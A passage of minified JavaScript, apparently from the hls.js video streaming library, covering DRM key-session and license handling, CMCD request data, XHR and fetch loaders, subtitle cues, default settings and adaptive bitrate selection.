this.setMediaKeysQueue.push(n),n.then((()=>{this.log(`Media-keys set for "${t}"`),r.push(n),this.setMediaKeysQueue=this.setMediaKeysQueue.filter((t=>-1===r.indexOf(t)))}))}generateRequestWithPreferredKeySession(n,t,e,r){var i=null==(i=this.config.drmSystems)||null==(i=i[n.keySystem])?void 0:i.generateRequest;if(i)try{var a=i.call(this.hls,t,e,n);if(!a)throw new Error("Invalid response from configured generateRequest filter");t=a.initDataType,e=n.decryptdata.pssh=a.initData?new Uint8Array(a.initData):null}catch(t){if(this.warn(t.message),null!=(i=this.hls)&&i.config.debug)throw t}if(null===e)return this.log(`Skipping key-session request for "${r}" (no initData)`),Promise.resolve(n);const s=this.getKeyIdString(n.decryptdata),o=(this.log(`Generating key-session request for "${r}": ${s} (init data type: ${t} length: ${e?e.byteLength:null})`),new Kn),l=(n.mediaKeysSession.onmessage=t=>{var e,r=n.mediaKeysSession;r?(({messageType:t,message:e}=t),this.log(`"${t}" message event for session "${r.sessionId}" message size: `+e.byteLength),"license-request"===t||"license-renewal"===t?this.renewLicense(n,e).catch((t=>{this.handleError(t),o.emit("error",t)})):"license-release"===t?n.keySystem===p.FAIRPLAY&&(this.updateKeySession(n,vt("acknowledged")),this.removeSession(n)):this.warn(`unhandled media key message type "${t}"`)):o.emit("error",new Error("invalid state"))},n.mediaKeysSession.onkeystatuseschange=t=>{var e;n.mediaKeysSession?(this.onKeyStatusChange(n),e=n.keyStatus,o.emit("keyStatus",e),"expired"===e&&(this.warn(n.keySystem+" expired for key "+s),this.renewKeySession(n))):o.emit("error",new Error("invalid state"))},new Promise(((e,r)=>{o.on("error",r),o.on("keyStatus",(t=>{t.startsWith("usable")?e():"output-restricted"===t?r(new h({type:K.KEY_SYSTEM_ERROR,details:H.KEY_SYSTEM_STATUS_OUTPUT_RESTRICTED,fatal:!1},"HDCP level output restricted")):"internal-error"===t?r(new h({type:K.KEY_SYSTEM_ERROR,details:H.KEY_SYSTEM_STATUS_INTERNAL_ERROR,fatal:!0},`key status changed to "${t}"`)):"expired"===t?r(new Error("key expired while generating request")):this.warn(`unhandled key status change "${t}"`)}))})));return n.mediaKeysSession.generateRequest(t,e).then((()=>{var t;this.log(`Request generated for key-session "${null==(t=n.mediaKeysSession)?void 0:t.sessionId}" keyId: `+s)})).catch((t=>{throw new h({type:K.KEY_SYSTEM_ERROR,details:H.KEY_SYSTEM_NO_SESSION,error:t,fatal:!1},"Error generating key-session request: "+t)})).then((()=>l)).catch((t=>{throw o.removeAllListeners(),this.removeSession(n),t})).then((()=>(o.removeAllListeners(),n)))}onKeyStatusChange(r){r.mediaKeysSession.keyStatuses.forEach(((t,e)=>{this.log(`key status change "${t}" for keyStatuses keyId: ${g_hexDump("buffer"in e?new Uint8Array(e.buffer,e.byteOffset,e.byteLength):new Uint8Array(e))} session keyId: ${g_hexDump(new Uint8Array(r.decryptdata.keyId||[]))} uri: `+r.decryptdata.uri),r.keyStatus=t}))}fetchServerCertificate(o){const r=this.config,n=new r.loader(r),l=this.getServerCertificateUrl(o);return l?(this.log(`Fetching serverCertificate for "${o}"`),new Promise(((i,a)=>{const s={responseType:"arraybuffer",url:l};var t={loadPolicy:t=r.certLoadPolicy.default,timeout:t.maxLoadTimeMs,maxRetry:0,retryDelay:0,maxRetryDelay:0},e={onSuccess:(t,e,r,n)=>{i(t.data)},onError:(t,e,r,n)=>{a(new h({type:K.KEY_SYSTEM_ERROR,details:H.KEY_SYSTEM_SERVER_CERTIFICATE_REQUEST_FAILED,fatal:!0,networkDetails:r,response:f({url:s.url,data:void 0},t)},`"${o}" certificate request failed (${l}). Status: ${t.code} (${t.text})`))},onTimeout:(t,e,r)=>{a(new h({type:K.KEY_SYSTEM_ERROR,details:H.KEY_SYSTEM_SERVER_CERTIFICATE_REQUEST_FAILED,fatal:!0,networkDetails:r,response:{url:s.url,data:void 0}},`"${o}" certificate request timed out (${l})`))},onAbort:(t,e,r)=>{a(new Error("aborted"))}};n.load(s,t,e)}))):Promise.resolve()}setMediaKeysServerCertificate(n,i,a){return new Promise(((e,r)=>{n.setServerCertificate(a).then((t=>{this.log(`setServerCertificate ${t?"success":"not supported by CDM"} (${null==a?void 0:a.byteLength}) on "${i}"`),e(n)})).catch((t=>{r(new h({type:K.KEY_SYSTEM_ERROR,details:H.KEY_SYSTEM_SERVER_CERTIFICATE_UPDATE_FAILED,error:t,fatal:!0},t.message))}))}))}renewLicense(e,t){return this.requestLicense(e,new Uint8Array(t)).then((t=>this.updateKeySession(e,new Uint8Array(t)).catch((t=>{throw new h({type:K.KEY_SYSTEM_ERROR,details:H.KEY_SYSTEM_SESSION_UPDATE_FAILED,error:t,fatal:!0},t.message)}))))}setupLicenseXHR(e,r,n,i){const a=this.config.licenseXhrSetup;return a?Promise.resolve().then((()=>{if(n.decryptdata)return a.call(this.hls,e,r,n,i);throw new Error("Key removed")})).catch((t=>{if(n.decryptdata)return e.open("POST",r,!0),a.call(this.hls,e,r,n,i);throw t})).then((t=>(e.readyState||e.open("POST",r,!0),{xhr:e,licenseChallenge:t||i}))):(e.open("POST",r,!0),Promise.resolve({xhr:e,licenseChallenge:i}))}requestLicense(a,s){const o=this.config.keyLoadPolicy.default;return new Promise(((r,t)=>{const n=this.getLicenseServerUrl(a.keySystem),i=(this.log("Sending license request to URL: "+n),new XMLHttpRequest);i.responseType="arraybuffer",i.onreadystatechange=()=>{if(!this.hls||!a.mediaKeysSession)return t(new Error("invalid state"));if(4===i.readyState)if(200===i.status){this._requestLicenseFailureCount=0;let t=i.response;if(this.log("License received "+(t instanceof ArrayBuffer?t.byteLength:t)),e=this.config.licenseResponseCallback)try{t=e.call(this.hls,i,n,a)}catch(t){this.error(t)}r(t)}else{var e=(e=o.errorRetry)?e.maxNumRetry:0;this._requestLicenseFailureCount++,this._requestLicenseFailureCount>e||400<=i.status&&i.status<500?t(new h({type:K.KEY_SYSTEM_ERROR,details:H.KEY_SYSTEM_LICENSE_REQUEST_FAILED,fatal:!0,networkDetails:i,response:{url:n,data:void 0,code:i.status,text:i.statusText}},`License Request XHR failed (${n}). Status: ${i.status} (${i.statusText})`)):(e=e-this._requestLicenseFailureCount+1,this.warn(`Retrying license request, ${e} attempts left`),this.requestLicense(a,s).then(r,t))}},a.licenseXhr&&a.licenseXhr.readyState!==XMLHttpRequest.DONE&&a.licenseXhr.abort(),a.licenseXhr=i,this.setupLicenseXHR(i,n,a,s).then((({xhr:t,licenseChallenge:e})=>{t.send(e)}))}))}onMediaAttached(t,e){this.config.emeEnabled&&(e=e.media,(this.media=e).addEventListener("encrypted",this.onMediaEncrypted),e.addEventListener("waitingforkey",this.onWaitingForKey))}onMediaDetached(){const e=this.media,t=this.mediaKeySessions,r=(e&&(e.removeEventListener("encrypted",this.onMediaEncrypted),e.removeEventListener("waitingforkey",this.onWaitingForKey),this.media=null),this._requestLicenseFailureCount=0,this.setMediaKeysQueue=[],this.mediaKeySessions=[],this.keyIdToKeySessionPromise={},Zt.clearKeyUriToKeyIdMap(),t.length);Qi.CDMCleanupPromise=Promise.all(t.map((t=>this.removeSession(t))).concat(null==e?void 0:e.setMediaKeys(null).catch((t=>{this.log(`Could not clear media keys: ${t}. media.src: `+(null==e?void 0:e.src))})))).then((()=>{r&&(this.log("finished closing key sessions and clearing media keys"),t.length=0)})).catch((t=>{this.log(`Could not close sessions and clear media keys: ${t}. media.src: `+(null==e?void 0:e.src))}))}onManifestLoading(){this.keyFormatPromise=null}onManifestLoaded(t,{sessionKeys:e}){e&&this.config.emeEnabled&&(this.keyFormatPromise||(e=e.reduce(((t,e)=>(-1===t.indexOf(e.keyFormat)&&t.push(e.keyFormat),t)),[]),this.log("Selecting key-system from session-keys "+e.join(", ")),this.keyFormatPromise=this.getKeyFormatPromise(e)))}removeSession(t){const{mediaKeysSession:e,licenseXhr:r}=t;if(e)return this.log("Remove licenses and keys and close session "+e.sessionId),e.onmessage=null,e.onkeystatuseschange=null,r&&r.readyState!==XMLHttpRequest.DONE&&r.abort(),t.mediaKeysSession=t.decryptdata=t.licenseXhr=void 0,-1<(t=this.mediaKeySessions.indexOf(t))&&this.mediaKeySessions.splice(t,1),e.remove().catch((t=>{this.log("Could not remove session: "+t)})).then((()=>e.close())).catch((t=>{this.log("Could not close session: "+t)}))}}Qi.CDMCleanupPromise=void 0;class h extends Error{constructor(t,e){super(e),this.data=void 0,t.error||(t.error=new Error(e)),(this.data=t).err=t.error}}class na{constructor(t){this.hls=void 0,this.config=void 0,this.media=void 0,this.sid=void 0,this.cid=void 0,this.useHeaders=!1,this.initialized=!1,this.starved=!1,this.buffering=!0,this.audioBuffer=void 0,this.videoBuffer=void 0,this.onWaiting=()=>{this.initialized&&(this.starved=!0),this.buffering=!0},this.onPlaying=()=>{this.initialized||(this.initialized=!0),this.buffering=!1},this.applyPlaylistData=t=>{try{this.apply(t,{ot:"m",su:!this.initialized})}catch(t){V.warn("Could not generate manifest CMCD data.",t)}},this.applyFragmentData=t=>{try{var e=t.frag,r=this.hls.levels[e.level],n=this.getObjectType(e),i={d:1e3*e.duration,ot:n};"v"!==n&&"a"!==n&&"av"!=n||(i.br=r.bitrate/1e3,i.tb=this.getTopBandwidth(n)/1e3,i.bl=this.getBufferLength(n)),this.apply(t,i)}catch(t){V.warn("Could not generate segment CMCD data.",t)}},this.hls=t;var e=(t=this.config=t.config).cmcd;null!=e&&(t.pLoader=this.createPlaylistLoader(),t.fLoader=this.createFragmentLoader(),this.sid=e.sessionId||na.uuid(),this.cid=e.contentId,this.useHeaders=!0===e.useHeaders,this.registerListeners())}registerListeners(){var t=this.hls;t.on($.MEDIA_ATTACHED,this.onMediaAttached,this),t.on($.MEDIA_DETACHED,this.onMediaDetached,this),t.on($.BUFFER_CREATED,this.onBufferCreated,this)}unregisterListeners(){var t=this.hls;t.off($.MEDIA_ATTACHED,this.onMediaAttached,this),t.off($.MEDIA_DETACHED,this.onMediaDetached,this),t.off($.BUFFER_CREATED,this.onBufferCreated,this)}destroy(){this.unregisterListeners(),this.onMediaDetached(),this.hls=this.config=this.audioBuffer=this.videoBuffer=null}onMediaAttached(t,e){this.media=e.media,this.media.addEventListener("waiting",this.onWaiting),this.media.addEventListener("playing",this.onPlaying)}onMediaDetached(){this.media&&(this.media.removeEventListener("waiting",this.onWaiting),this.media.removeEventListener("playing",this.onPlaying),this.media=null)}onBufferCreated(t,e){var r;this.audioBuffer=null==(r=e.tracks.audio)?void 0:r.buffer,this.videoBuffer=null==(r=e.tracks.video)?void 0:r.buffer}createData(){var t;return{v:1,sf:"h",sid:this.sid,cid:this.cid,pr:null==(t=this.media)?void 0:t.playbackRate,mtp:this.hls.bandwidthEstimate/1e3}}apply(t,e={}){G(e,this.createData());var r="i"===e.ot||"v"===e.ot||"av"===e.ot;this.starved&&r&&(e.bs=!0,e.su=!0,this.starved=!1),null==e.su&&(e.su=this.buffering),this.useHeaders?(r=na.toHeaders(e),Object.keys(r).length&&(t.headers||(t.headers={}),G(t.headers,r))):(r=na.toQuery(e))&&(t.url=na.appendQueryToUri(t.url,r))}getObjectType(t){var e=t.type;return"subtitle"===e?"tt":"initSegment"===t.sn?"i":"audio"===e?"a":"main"===e?this.hls.audioTracks.length?"v":"av":void 0}getTopBandwidth(t){let r,e=0;var n=this.hls;for(const i of r="a"===t?n.audioTracks:(t=-1<(t=n.maxAutoLevel)?t+1:n.levels.length,n.levels.slice(0,t)))i.bitrate>e&&(e=i.bitrate);return 0<e?e:NaN}getBufferLength(t){var e=this.hls.media;return(t="a"===t?this.audioBuffer:this.videoBuffer)&&e?1e3*S.bufferInfo(t,e.currentTime,this.config.maxBufferHole).len:NaN}createPlaylistLoader(){var t=this.config.pLoader;const n=this.applyPlaylistData,e=t||this.config.loader;return class{constructor(t){this.loader=void 0,this.loader=new e(t)}get stats(){return this.loader.stats}get context(){return this.loader.context}destroy(){this.loader.destroy()}abort(){this.loader.abort()}load(t,e,r){n(t),this.loader.load(t,e,r)}}}createFragmentLoader(){var t=this.config.fLoader;const n=this.applyFragmentData,e=t||this.config.loader;return class{constructor(t){this.loader=void 0,this.loader=new e(t)}get stats(){return this.loader.stats}get context(){return this.loader.context}destroy(){this.loader.destroy()}abort(){this.loader.abort()}load(t,e,r){n(t),this.loader.load(t,e,r)}}}static uuid(){var t=URL.createObjectURL(new Blob),e=t.toString();return URL.revokeObjectURL(t),e.slice(e.lastIndexOf("/")+1)}static serialize(t){var r=[];const e=t=>Math.round(t);var n=t=>100*e(t/100),i={br:e,d:e,bl:n,dl:n,mtp:n,nor:t=>encodeURIComponent(t),rtp:n,tb:e};for(const s of Object.keys(t||{}).sort()){let e=t[s];if(!(a=e,Number.isNaN(a)||null==a||""===a||!1===a||"v"===s&&1===e||"pr"==s&&1===e)){var a=typeof(e=(a=i[s])?a(e):e);let t;t="ot"===s||"sf"===s||"st"===s?s+"="+e:"boolean"==a?s:"number"==a?s+"="+e:s+"="+JSON.stringify(e),r.push(t)}}return r.join(",")}static toHeaders(t){var e={},r=["Object","Request","Session","Status"],n=[{},{},{},{}],i={br:0,d:0,ot:0,tb:0,bl:1,dl:1,mtp:1,nor:1,nrr:1,su:1,cid:2,pr:2,sf:2,sid:2,st:2,v:2,bs:3,rtp:3};for(const s of Object.keys(t))n[null!=i[s]?i[s]:1][s]=t[s];for(let t=0;t<n.length;t++){var a=na.serialize(n[t]);a&&(e["CMCD-"+r[t]]=a)}return e}static toQuery(t){return"CMCD="+encodeURIComponent(na.serialize(t))}static appendQueryToUri(t,e){var r;return e?(r=t.includes("?")?"&":"?",t+r+e):t}}function ia(e,n,i,a){e&&Object.keys(n).forEach((r=>{var t=e.filter((t=>t.groupId===r)).map((t=>{var e=G({},t);return e.details=void 0,e.attrs=new B(e.attrs),e.url=e.attrs.URI=aa(t.url,t.attrs["STABLE-RENDITION-ID"],"PER-RENDITION-URIS",i),e.groupId=e.attrs["GROUP-ID"]=n[r],e.attrs["PATHWAY-ID"]=a,e}));e.push(...t)}))}function aa(t,e,r,n){const{HOST:i,PARAMS:a,[r]:s}=n;let o;e&&(o=null==s?void 0:s[e])&&(t=o);const l=new self.URL(t);return i&&!o&&(l.host=i),a&&Object.keys(a).sort().forEach((t=>{t&&l.searchParams.set(t,a[t])})),l.href}const sa=/^age:\s*[\d.]+\s*$/im;class oa{constructor(t){this.xhrSetup=void 0,this.requestTimeout=void 0,this.retryTimeout=void 0,this.retryDelay=void 0,this.config=null,this.callbacks=null,this.context=void 0,this.loader=null,this.stats=void 0,this.xhrSetup=t&&t.xhrSetup||null,this.stats=new ot,this.retryDelay=0}destroy(){this.callbacks=null,this.abortInternal(),this.loader=null,this.config=null}abortInternal(){var t=this.loader;self.clearTimeout(this.requestTimeout),self.clearTimeout(this.retryTimeout),t&&(t.onreadystatechange=null,t.onprogress=null,4!==t.readyState)&&(this.stats.aborted=!0,t.abort())}abort(){var t;this.abortInternal(),null!=(t=this.callbacks)&&t.onAbort&&this.callbacks.onAbort(this.stats,this.context,this.loader)}load(t,e,r){if(this.stats.loading.start)throw new Error("Loader can only be used once.");this.stats.loading.start=self.performance.now(),this.context=t,this.config=e,this.callbacks=r,this.loadInternal()}loadInternal(){const{config:t,context:e}=this;if(t){const r=this.loader=new self.XMLHttpRequest,n=this.stats,i=(n.loading.first=0,n.loaded=0,n.aborted=!1,this.xhrSetup);i?Promise.resolve().then((()=>{if(!this.stats.aborted)return i(r,e.url)})).catch((t=>(r.open("GET",e.url,!0),i(r,e.url)))).then((()=>{this.stats.aborted||this.openAndSendXhr(r,e,t)})).catch((t=>{this.callbacks.onError({code:r.status,text:t.message},e,r,n)})):this.openAndSendXhr(r,e,t)}}openAndSendXhr(t,e,r){t.readyState||t.open("GET",e.url,!0);var n=this.context.headers,{maxTimeToFirstByteMs:i,maxLoadTimeMs:a}=r.loadPolicy;if(n)for(const s in n)t.setRequestHeader(s,n[s]);e.rangeEnd&&t.setRequestHeader("Range","bytes="+e.rangeStart+"-"+(e.rangeEnd-1)),t.onreadystatechange=this.readystatechange.bind(this),t.onprogress=this.loadprogress.bind(this),t.responseType=e.responseType,self.clearTimeout(this.requestTimeout),r.timeout=i&&N(i)?i:a,this.requestTimeout=self.setTimeout(this.loadtimeout.bind(this),r.timeout),t.send()}readystatechange(){var t,e,r,n,{context:i,loader:a,stats:s}=this;i&&a&&(e=a.readyState,t=this.config,s.aborted||2<=e&&(0===s.loading.first&&(s.loading.first=Math.max(self.performance.now(),s.loading.start),t.timeout!==t.loadPolicy.maxLoadTimeMs)&&(self.clearTimeout(this.requestTimeout),t.timeout=t.loadPolicy.maxLoadTimeMs,this.requestTimeout=self.setTimeout(this.loadtimeout.bind(this),t.loadPolicy.maxLoadTimeMs-(s.loading.first-s.loading.start))),4===e)&&(self.clearTimeout(this.requestTimeout),a.onreadystatechange=null,a.onprogress=null,e=a.status,n="text"!==a.responseType,200<=e&&e<300&&(n&&a.response||null!==a.responseText)?(s.loading.end=Math.max(self.performance.now(),s.loading.first),n=n?a.response:a.responseText,r="arraybuffer"===a.responseType?n.byteLength:n.length,s.loaded=s.total=r,s.bwEstimate=8e3*s.total/(s.loading.end-s.loading.first),this.callbacks&&((r=this.callbacks.onProgress)&&r(s,i,n,a),this.callbacks)&&(r={url:a.responseURL,data:n,code:e},this.callbacks.onSuccess(r,s,i,a))):er(n=t.loadPolicy.errorRetry,s.retry,!1,e)?this.retry(n):(V.error(e+" while loading "+i.url),this.callbacks.onError({code:e,text:a.statusText},i,a,s))))}loadtimeout(){var t=null==(t=this.config)?void 0:t.loadPolicy.timeoutRetry;er(t,this.stats.retry,!0)?this.retry(t):(V.warn("timeout while loading "+this.context.url),(t=this.callbacks)&&(this.abortInternal(),t.onTimeout(this.stats,this.context,this.loader)))}retry(t){var{context:e,stats:r}=this;this.retryDelay=Ze(t,r.retry),r.retry++,V.warn(`${status?"HTTP Status "+status:"Timeout"} while loading ${e.url}, retrying ${r.retry}/${t.maxNumRetry} in ${this.retryDelay}ms`),this.abortInternal(),this.loader=null,self.clearTimeout(this.retryTimeout),this.retryTimeout=self.setTimeout(this.loadInternal.bind(this),this.retryDelay)}loadprogress(t){var e=this.stats;e.loaded=t.loaded,t.lengthComputable&&(e.total=t.total)}getCacheAge(){let t=null;var e;return this.loader&&sa.test(this.loader.getAllResponseHeaders())&&(t=(e=this.loader.getResponseHeader("age"))?parseFloat(e):null),t}getResponseHeader(t){return this.loader&&new RegExp(`^${t}:\\s*[\\d.]+\\s*$`,"im").test(this.loader.getAllResponseHeaders())?this.loader.getResponseHeader(t):null}}const la=/(\d+)-(\d+)\/(\d+)/;class ua{constructor(t){this.fetchSetup=void 0,this.requestTimeout=void 0,this.request=void 0,this.response=void 0,this.controller=void 0,this.context=void 0,this.config=null,this.callbacks=null,this.stats=void 0,this.loader=null,this.fetchSetup=t.fetchSetup||ha,this.controller=new self.AbortController,this.stats=new ot}destroy(){this.loader=this.callbacks=null,this.abortInternal()}abortInternal(){var t=this.response;null!=t&&t.ok||(this.stats.aborted=!0,this.controller.abort())}abort(){var t;this.abortInternal(),null!=(t=this.callbacks)&&t.onAbort&&this.callbacks.onAbort(this.stats,this.context,this.response)}load(n,i,a){const s=this.stats;if(s.loading.start)throw new Error("Loader can only be used once.");s.loading.start=self.performance.now();var t=function(t,e){return e={method:"GET",mode:"cors",credentials:"same-origin",signal:e,headers:new self.Headers(G({},t.headers))},t.rangeEnd&&e.headers.set("Range","bytes="+t.rangeStart+"-"+String(t.rangeEnd-1)),e}(n,this.controller.signal);const o=a.onProgress,l="arraybuffer"===n.responseType,u=l?"byteLength":"length",{maxTimeToFirstByteMs:e,maxLoadTimeMs:h}=i.loadPolicy;this.context=n,this.config=i,this.callbacks=a,this.request=this.fetchSetup(n,t),self.clearTimeout(this.requestTimeout),i.timeout=e&&N(e)?e:h,this.requestTimeout=self.setTimeout((()=>{this.abortInternal(),a.onTimeout(s,n,this.response)}),i.timeout),self.fetch(this.request).then((t=>{this.response=this.loader=t;var e,r=Math.max(self.performance.now(),s.loading.start);if(self.clearTimeout(this.requestTimeout),i.timeout=h,this.requestTimeout=self.setTimeout((()=>{this.abortInternal(),a.onTimeout(s,n,this.response)}),h-(r-s.loading.start)),t.ok)return s.loading.first=r,s.total=function(t){var e=t.get("Content-Range");return e&&(e=function(t){if(t=la.exec(t))return parseInt(t[2])-parseInt(t[1])+1}(e),N(e))?e:(e=t.get("Content-Length"))?parseInt(e):void 0}(t.headers)||s.total,o&&N(i.highWaterMark)?this.loadProgressively(t,s,n,i.highWaterMark,o):l?t.arrayBuffer():"json"===n.responseType?t.json():t.text();throw({status:r,statusText:e}=t),new ca(e||"fetch, bad network response",r,t)})).then((t=>{var e=this.response,r=((r=(self.clearTimeout(this.requestTimeout),s.loading.end=Math.max(self.performance.now(),s.loading.first),t[u]))&&(s.loaded=s.total=r),{url:e.url,data:t,code:e.status});o&&!N(i.highWaterMark)&&o(s,n,t,e),a.onSuccess(r,s,n,e)})).catch((t=>{var e,r;self.clearTimeout(this.requestTimeout),s.aborted||(e=t&&t.code||0,r=t?t.message:null,a.onError({code:e,text:r},n,t?t.details:null,s))}))}getCacheAge(){let t=null;var e;return this.response&&(t=(e=this.response.headers.get("age"))?parseFloat(e):null),t}getResponseHeader(t){return this.response?this.response.headers.get(t):null}loadProgressively(r,n,i,a=0,s){const o=new Qn,t=r.body.getReader(),l=()=>t.read().then((t=>{var e;return t.done?(o.dataLength&&s(n,i,o.flush(),r),Promise.resolve(new ArrayBuffer(0))):(e=(t=t.value).length,n.loaded+=e,e<a||o.dataLength?(o.push(t),o.dataLength>=a&&s(n,i,o.flush(),r)):s(n,i,t,r),l())})).catch((()=>Promise.reject()));return l()}}function ha(t,e){return new self.Request(t.url,e)}class ca extends Error{constructor(t,e,r){super(t),this.code=void 0,this.details=void 0,this.code=e,this.details=r}}const da=/\s/,fa={newCue(e,r,n,i){var a,s=[];let o,l,u;var h,c=self.VTTCue||self.TextTrackCue;for(let t=0;t<i.rows.length;t++)if(o=!0,l=0,u="",!(a=i.rows[t]).isEmpty()){for(let t=0;t<a.chars.length;t++)da.test(a.chars[t].uchar)&&o?l++:(u+=a.chars[t].uchar,o=!1);(a.cueStartTime=r)===n&&(n+=1e-4),16<=l?l--:l++;var d=Di(u.trim()),f=Mi(r,n,d);null!=e&&null!=(h=e.cues)&&h.getCueById(f)||((h=new c(r,n,d)).id=f,h.line=t+1,h.align="left",h.position=10+Math.min(80,10*Math.floor(8*l/32)),s.push(h))}return e&&s.length&&(s.sort(((t,e)=>"auto"===t.line||"auto"===e.line?0:8<t.line&&8<e.line?e.line-t.line:t.line-e.line)),s.forEach((t=>ke(e,t)))),s}},pa=f(f({autoStartLoad:!0,startPosition:-1,defaultAudioCodec:void 0,debug:!1,capLevelOnFPSDrop:!1,capLevelToPlayerSize:!1,ignoreDevicePixelRatio:!1,initialLiveManifestSize:1,maxBufferLength:30,backBufferLength:1/0,maxBufferSize:6e7,maxBufferHole:.1,highBufferWatchdogPeriod:2,nudgeOffset:.1,nudgeMaxRetry:3,maxFragLookUpTolerance:.25,liveSyncDurationCount:3,liveMaxLatencyDurationCount:1/0,liveSyncDuration:void 0,liveMaxLatencyDuration:void 0,maxLiveSyncPlaybackRate:1,liveDurationInfinity:!1,liveBackBufferLength:null,maxMaxBufferLength:600,enableWorker:!0,workerPath:null,enableSoftwareAES:!0,startLevel:void 0,startFragPrefetch:!1,fpsDroppedMonitoringPeriod:5e3,fpsDroppedMonitoringThreshold:.2,appendErrorMaxRetry:3,loader:oa,fLoader:void 0,pLoader:void 0,xhrSetup:void 0,licenseXhrSetup:void 0,licenseResponseCallback:void 0,abrController:class{constructor(t){this.hls=void 0,this.lastLevelLoadSec=0,this.lastLoadedFragLevel=0,this._nextAutoLevel=-1,this.timer=-1,this.onCheck=this._abandonRulesCheck.bind(this),this.fragCurrent=null,this.partCurrent=null,this.bitrateTestDelay=0,this.bwEstimator=void 0,t=(this.hls=t).config,this.bwEstimator=new zn(t.abrEwmaSlowVoD,t.abrEwmaFastVoD,t.abrEwmaDefaultEstimate),this.registerListeners()}registerListeners(){var t=this.hls;t.on($.FRAG_LOADING,this.onFragLoading,this),t.on($.FRAG_LOADED,this.onFragLoaded,this),t.on($.FRAG_BUFFERED,this.onFragBuffered,this),t.on($.LEVEL_SWITCHING,this.onLevelSwitching,this),t.on($.LEVEL_LOADED,this.onLevelLoaded,this)}unregisterListeners(){var t=this.hls;t.off($.FRAG_LOADING,this.onFragLoading,this),t.off($.FRAG_LOADED,this.onFragLoaded,this),t.off($.FRAG_BUFFERED,this.onFragBuffered,this),t.off($.LEVEL_SWITCHING,this.onLevelSwitching,this),t.off($.LEVEL_LOADED,this.onLevelLoaded,this)}destroy(){this.unregisterListeners(),this.clearTimer(),this.hls=this.onCheck=null,this.fragCurrent=this.partCurrent=null}onFragLoading(t,e){var r=e.frag;this.ignoreFragment(r)||(this.fragCurrent=r,this.partCurrent=null!=(r=e.part)?r:null,this.clearTimer(),this.timer=self.setInterval(this.onCheck,100))}onLevelSwitching(t,e){this.clearTimer()}getTimeToLoadFrag(t,e,r,n){return t+r/e+(n?this.lastLevelLoadSec:0)}onLevelLoaded(t,e){var r=this.hls.config,{total:n,bwEstimate:i}=e.stats;N(n)&&N(i)&&(this.lastLevelLoadSec=8*n/i),e.details.live?this.bwEstimator.update(r.abrEwmaSlowLive,r.abrEwmaFastLive):this.bwEstimator.update(r.abrEwmaSlowVoD,r.abrEwmaFastVoD)}_abandonRulesCheck(){var{fragCurrent:r,partCurrent:n,hls:i}=this,{autoLevelEnabled:a,media:s}=i;if(r&&s){var o=performance.now(),l=(n||r).stats,u=(n||r).duration;o=o-l.loading.start;if(l.aborted||l.loaded&&l.loaded===l.total||0===r.level)this.clearTimer(),this._nextAutoLevel=-1;else if(a&&!s.paused&&s.playbackRate&&s.readyState&&null!==(a=i.mainForwardBufferInfo)){var h=this.bwEstimator.getEstimateTTFB();s=Math.abs(s.playbackRate);if(!(o<=Math.max(h,u/(2*s)*1e3))){var c=a.len/s;if(!(2*u/s<=c)){var a=l.loading.first?l.loading.first-l.loading.start:-1,s=l.loaded&&-1<a,d=this.bwEstimator.getEstimate(),{levels:f,minAutoLevel:p}=i,g=f[r.level];g=l.total||Math.max(l.loaded,Math.round(u*g.maxBitrate/8));let t=o-a;t<1&&s&&(t=Math.min(o,8*l.loaded/d));var v=s?1e3*l.loaded/t:0;if(!((g=v?(g-l.loaded)/v:8*g/d+h/1e3)<=c)){var m=v?8*v:d;let e,t=Number.POSITIVE_INFINITY;for(e=r.level-1;e>p;e--){var y=f[e].maxBitrate;if((t=this.getTimeToLoadFrag(h/1e3,m,u*y,!f[e].details))<c)break}t>=g||t>10*u||(i.nextLoadLevel=e,s?this.bwEstimator.sample(o-Math.min(h,a),l.loaded):this.bwEstimator.sampleTTFB(o),this.clearTimer(),V.warn(`[abr] Fragment ${r.sn}${n?" part "+n.index:""} of level ${r.level} is loading too slowly;\n      Time to underbuffer: ${c.toFixed(3)} s\n      Estimated load time for current fragment: ${g.toFixed(3)} s\n      Estimated load time for down switch fragment: ${t.toFixed(3)} s\n      TTFB estimate: ${a}\n      Current BW estimate: ${N(d)?(d/1024).toFixed(3):"Unknown"} Kb/s\n      New BW estimate: ${(this.bwEstimator.getEstimate()/1024).toFixed(3)} Kb/s\n      Aborting and switching to level `+e),r.loader&&(this.fragCurrent=this.partCurrent=null,r.abortRequests()),i.trigger($.FRAG_LOAD_EMERGENCY_ABORTED,{frag:r,part:n,stats:l}))}}}}}}onFragLoaded(t,{frag:e,part:r}){var n,i,a,s=(r||e).stats;e.type===A&&this.bwEstimator.sampleTTFB(s.loading.first-s.loading.start),this.ignoreFragment(e)||(this.clearTimer(),this.lastLoadedFragLevel=e.level,this._nextAutoLevel=-1,this.hls.config.abrMaxWithRealBitrate&&(i=(r||e).duration,n=((a=this.hls.levels[e.level]).loaded?a.loaded.bytes:0)+s.loaded,i=(a.loaded?a.loaded.duration:0)+i,a.loaded={bytes:n,duration:i},a.realBitrate=Math.round(8*n/i)),e.bitrateTest&&(a={stats:s,frag:e,part:r,id:e.type},this.onFragBuffered($.FRAG_BUFFERED,a),e.bitrateTest=!1))}onFragBuffered(t,e){var r,n,{frag:e,part:n}=e;(n=(null!=n&&n.stats.loaded?n:e).stats).aborted||this.ignoreFragment(e)||(r=n.parsing.end-n.loading.start-Math.min(n.loading.first-n.loading.start,this.bwEstimator.getEstimateTTFB()),this.bwEstimator.sample(r,n.loaded),n.bwEstimate=this.bwEstimator.getEstimate(),e.bitrateTest?this.bitrateTestDelay=r/1e3:this.bitrateTestDelay=0)}ignoreFragment(t){return t.type!==A||"initSegment"===t.sn}clearTimer(){self.clearInterval(this.timer)}get nextAutoLevel(){var t=this._nextAutoLevel,e=this.bwEstimator;if(-1!==t&&!e.canEstimate())return t;let r=this.getNextABRAutoLevel();return-1!==t&&(e=this.hls.levels).length>Math.max(t,r)&&e[t].loadError<=e[r].loadError?t:-1!==t?Math.min(t,r):r}getNextABRAutoLevel(){var t,e,{fragCurrent:e,partCurrent:r,hls:n}=this,{maxAutoLevel:i,config:a,minAutoLevel:s,media:o}=n,r=r?r.duration:e?e.duration:0,o=(e=o&&0!==o.playbackRate?Math.abs(o.playbackRate):1,this.bwEstimator?this.bwEstimator.getEstimate():a.abrEwmaDefaultEstimate),n=((n=n.mainForwardBufferInfo)?n.len:0)/e;if(0<=(e=this.findBestLevel(o,s,i,n,a.abrBandWidthFactor,a.abrBandWidthUpFactor)))return e;V.trace(`[abr] ${n?"rebuffering expected":"buffer is empty"}, finding optimal quality level`);let 